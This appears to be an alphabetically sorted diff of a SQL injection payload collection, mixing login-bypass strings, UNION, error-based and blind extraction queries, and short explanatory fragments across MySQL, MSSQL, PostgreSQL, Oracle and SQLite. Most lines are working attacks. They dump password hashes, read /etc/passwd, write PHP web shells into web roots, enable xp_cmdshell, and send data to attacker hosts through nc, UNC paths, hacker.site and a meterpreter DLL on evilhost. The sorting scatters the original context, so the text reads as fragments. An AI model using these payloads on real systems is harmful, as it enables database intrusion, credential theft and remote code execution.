+SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name;
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
+SELECT * FROM mysql.innodb_table_stats;
+SELECT * FROM nc;
+SELECT * FROM products WHERE product_name LIKE '%user_input%'
+SELECT * FROM temp limit 1 offset 0;
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
+SELECT * FROM users WHERE username = 'user' AND password = 'pass';
+SELECT * from pg_largeobject; -- or just get all the large objects and their data
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
+SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
+SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
+SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
+SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
+SELECT DB_NAME(N);
+SELECT LOAD_FILE('\\\\error\\abc');
+SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
+SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
+SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
+SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
+SELECT current_setting('is_superuser');
+SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
+SELECT database_to_xml(true,true,''); -- dump the current database to XML
+SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
+SELECT f();
+SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
+SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--
+SELECT into p (SELECT YOUR-QUERY-HERE);
+SELECT is_srvrolemember('sysadmin');
+SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
+SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
+SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
+SELECT lo_get(16420); -- use the OID returned from the above
+SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
+SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';
+SELECT message FROM data WHERE row = 1 and message like 't%'
+SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
+SELECT name FROM master..sysdatabases;
+SELECT name FROM master..sysobjects WHERE xtype = 'U';
+SELECT name FROM master.sys.databases;
+SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
+SELECT name, password FROM master..sysxlogins
+SELECT name, password_hash FROM master.sys.sql_logins
+SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
+SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
+SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
+SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
+SELECT table_catalog, column_name FROM information_schema.columns
+SELECT table_catalog, table_name FROM information_schema.columns
+SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'
+SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
+SELECT writefile('/path/to/file', column_name) FROM table_name
+SHOW is_superuser;
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
+Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.
+Since you are inserting your payload in the database for a later use, any other type of injections can be used UNION, ERROR, BLIND, STACKED, etc.
+Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.
+The `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.
+The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored.
+The format is: `base 'e' exponent`.
+The term "UNC path" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\server\share\file`.
+Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.
+This query will insert a row for the user "`attacker_dummy@example.com`". It will also insert a row for the user "`admin@example.com`".
+This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`
+UNION ALL SELECT
+UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
+UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
+UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
+UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
+UNION SELECT NULL, NULL, NULL;--
+UNION SELECT NULL, NULL;--
+UNION SELECT NULL;--
+UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
+Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`
+Use a semi-colon "`;`" to add another query
+WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
+Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term "wide byte" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.
+XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
+[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
+[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
+[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
+[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
+\x27UNION SELECT
+`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`
+`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.
+`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
+`username` varchar(20) not null
+â or 1=1 --
+â or 3=3 --
+a" or 1=1--
+a"""" or 3=3--"""
+a'
+a' or 'a' = 'a
+a' or 1=1--
+a' or 3=3--
+a' waitfor delay '0:0:10'--
+admin" #
+admin" --
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' #
+admin' --
+admin' and substring(password/text(),1,1)='7
+admin' or '
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin'/*
+admin'or 1=1 or ''='
+and 1 in (select var from temp)--
+and 1=( if((load_file(char(110,46,101,120,11 ...
+and 1=1
+and 1=1–
+anything' OR 'x'='x
+as
+asc
+attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
+begin
+benchmark(10000000,MD5(1))#
+bfilename
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+cast((SELECT @@version) as int)
+char%4039%41%2b%40SELECT
+declare @q nvarchar (200) 0x730065006c00650063 ...
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061 ...
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @q nvarchar (4000) select @q =
+declare @s varchar (200) select @s = 0x73656c6 ...
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar (8000) select @s = 0x73656c ...
+declare @s varchar(200) select @s = 0x77616974 ...
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+declare @s varchar(22) select @s =
+declare c text;
+declare p text;
+delete
+desc
+distinct
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+exec sp
+exec xp
+exec(@s)
+execute c;
+execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
+function check_addslashes($string)
+group by userid having 1=1--
+handler
+having
+having 1=1--
+hi or 1=1 --"
+hi or a=a
+hi"""") or (""""a""""=""""a"""
+hi' or 'a'='a
+hi' or 'x'='x';
+hi' or 1=1 --
+hi') or ('a'='a
+http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
+http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
+http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --
+http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 --
+http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
+http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
+http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
+http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
+insert
+like
+like '%'
+limit
+msf> use exploit/windows/mssql/mssql_linkcrawler
+mysql> SELECT @@GLOBAL.VERSION;
+mysql> SELECT @@innodb_version;
+mysql> SELECT @@version;
+mysql> SELECT sys_eval('id');
+mysql> SELECT version();
+mysql> SHOW TABLES IN dvwa;
+mysql_query("SET NAMES gbk");
+or
+or ""a""=""a"
+or ''='
+or '1'='1
+or '1'='1'--
+or '7659'='7659
+or 'a'='a
+or 'something' = 'some'+'thing'
+or 'text' = n'text'
+or 'text' > 't'
+or 'unusual' = 'unusual'
+or 'whatever' in ('whatever')
+or (EXISTS)
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+or 0=0 –
+or 1 --'
+or 1 in (select @@version)--
+or 1/*
+or 1=1
+or 1=1 /*
+or 1=1 or ""=
+or 1=1 or ''='
+or 1=1#
+or 1=1--
+or 1=1--"
+or 1=1/*
+or 1=1–
+or 2 > 1
+or 2 between 1 and 3
+or 3=3
+or a = a
+or a=a
+or a=a--
+or benchmark(10000000,MD5(1))#
+or isNULL(1/0) /*
+or pg_sleep(__TIME__)--
+or pg_sleep(__TIME__)--"
+or sleep(__TIME__)#
+or sleep(__TIME__)='
+or true
+or true--
+or username like char(37);
+or%201=1
+or%201=1 --
+order by
+page.asp?id=1 and 1=2 -- false
+page.asp?id=1 or 1=1 -- true
+page.asp?id=1" or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+password:*/=1--
+password="P@ssw0rd"
+pg_sleep(__TIME__)--
+print_r(mysql_error());
+procedure
+replace
+return $string;
+select
+select * from information_schema.tables--
+select * from master..sysservers
+select * from openquery("dcorp-sql1", 'select * from master..sysservers')
+select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
+select 1 from pg_sleep(5)
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
+select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
+select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
+select name from syscolumns where id = (sele ...
+select pg_ls_dir('./');
+select pg_read_file('PG_VERSION', 0, 200);
+select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
+select version from openquery("linkedserver", 'select @@version as version');
+sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
+sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
+sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
+sqlvuln
+sqlvuln;
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+truncate
+tz_offset
+uni/**/on sel/**/ect
+union all select @@version--
+union select
+union select * from users where login = char ...
+union select 1,load_file('/etc/passwd'),1,1,1;
+update
+username="anything' UNION SELECT Username, Password FROM Users;--"
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' OR full_name LIKE '%Bob%
+x' or 1=1 or 'x'='y
+xp_dirtree '\\attackerip\file'
+xp_fileexist '\\attackerip\file'
+{
+|
+|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+| --- | --- |
+| --- | --- | --- |
+| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |
+| ---- | -------- | ----------------------- | --------- |
+| --------- | ---------- |
+| --------- | --------------------------- |
+| --------- | ------------------------------------------ |
+| ---------- | ------------------------------- |
+| ----------- | ----------------------------------------- |
+| ----------- | ----------------------------------------------- |
+| ------------ | --------------- |
+| ------------- | ----------------------------------------- |
+| --------------- | --------------- | ------ |
+| --------------- | ----------------------------------------- |
+| ------------------ | --------- |
+| ------------------- | ------ |
+| ------------------- | ------- |
+| ------------------- | ------------------------------- |
+| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
+| ---------------------- | --------------------------------------- |
+| ---------------------- | -------------------------------------------- |
+| ----------------------- | ----------------------------------------- |
+| ------------------------ | ---------------------- |
+| ---------------------------- | --------------- |
+| ----------------------------------------- | -------------------- |
+| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |
+| 5.6.31           |
+| 5.6.31-0ubuntu0.15.10.1 |
+| 8.0.27           |
+| @@GLOBAL.VERSION |
+| @@innodb_version |
+| @@version               |
+| CAST         | `CAST((SELECT @@version) AS INT)` |
+| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
+| CAST | `AND (SELECT version())::int=1 -- -` |
+| CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
+| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
+| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
+| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
+| Current User           | `SELECT current_user;`                  |
+| Current User           | `SELECT getpgusername();`               |
+| Current User           | `SELECT session_user;`                  |
+| Current User           | `SELECT usename FROM pg_user;`          |
+| Current User           | `SELECT user;`                          |
+| DBMS version           | `SELECT version()`                      |
+| DBMS version    | `SELECT @@version`                        |
+| Database Name          | `SELECT CURRENT_DATABASE()`             |
+| Database Schema        | `SELECT CURRENT_SCHEMA()`               |
+| Database name   | `SELECT DB_NAME()`                        |
+| Database schema | `SELECT SCHEMA_NAME()`                    |
+| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |
+| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
+| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
+| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
+| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
+| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
+| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |
+| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
+| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
+| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
+| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
+| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |
+| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
+| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
+| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
+| Hostname        | `SELECT @@SERVERNAME`                     |
+| Hostname        | `SELECT @@hostname`                       |
+| Hostname        | `SELECT HOST_NAME()`                      |
+| Hostname        | `SELECT SERVERPROPERTY('edition')`        |
+| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |
+| Hostname        | `SELECT SERVERPROPERTY('productversion')` |
+| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |
+| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
+| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |
+| List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
+| List Databases         | `SELECT datname FROM pg_database`            |
+| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |
+| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |
+| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |
+| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
+| List Tables            | `SELECT table_name FROM information_schema.tables` |
+| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
+| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
+| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
+| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
+| Multi-Line Comment  | `/**/`  |
+| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
+| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
+| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
+| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
+| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
+| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
+| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |
+| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
+| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
+| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
+| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
+| Single-Line Comment | `--`    |
+| Tables_in_dvwa |
+| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
+| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |
+| User            | `SELECT CURRENT_USER`                     |
+| User            | `SELECT system_user;`                     |
+| User            | `SELECT user;`                            |
+| User            | `SELECT user_name();`                     |
+| `#`                        | Hash comment                      |
+| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |
+| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a" |
+| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |
+| `--`                       | SQL comment                       |
+| `/* MSSQL Comment */`      | C-style comment                   |
+| `/* MYSQL Comment */`      | C-style comment                   |
+| `/*! MYSQL Special SQL */` | Special SQL                       |
+| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
+| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |
+| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |
+| `1' LIMIT 1,1 INTO @,@--+`  | `The used SELECT statements have a different number of columns` |
+| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
+| `?id=(1)and(1)=(1)--`                     | Parenthesis          |
+| `?id=1%09and%091=1%09--` | Whitespace alternative |
+| `?id=1%0Aand%0A1=1%0A--` | Whitespace alternative |
+| `?id=1%0Band%0B1=1%0B--` | Whitespace alternative |
+| `?id=1%0Cand%0C1=1%0C--` | Whitespace alternative |
+| `?id=1%0Dand%0D1=1%0D--` | Whitespace alternative |
+| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
+| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |
+| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment              |
+| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |
+| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |
+| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |
+| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |
+| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |
+| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |
+| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
+| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
+| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |
+| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |
+| author_id | title                                                           |
+| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
+| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
+| guestbook      |
+| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8` | `'or'` |
+| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |
+| sha1 | 178374   | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`     |
+| sha1 | 3fDf     | `Q�u'='�@�[�t�- o��_-!` | `'='`     |
+| sys_eval('id') |
+| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+| users          |
+| version()               |
+|----------------------------|-----------------------------------|
+|-----------------------|---------------------------------------|
+|--------------------|--------------------------|
+||'6
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||(select 1 from pg_sleep(5))
+||6
+||UTL_HTTP.REQUEST
+}
+
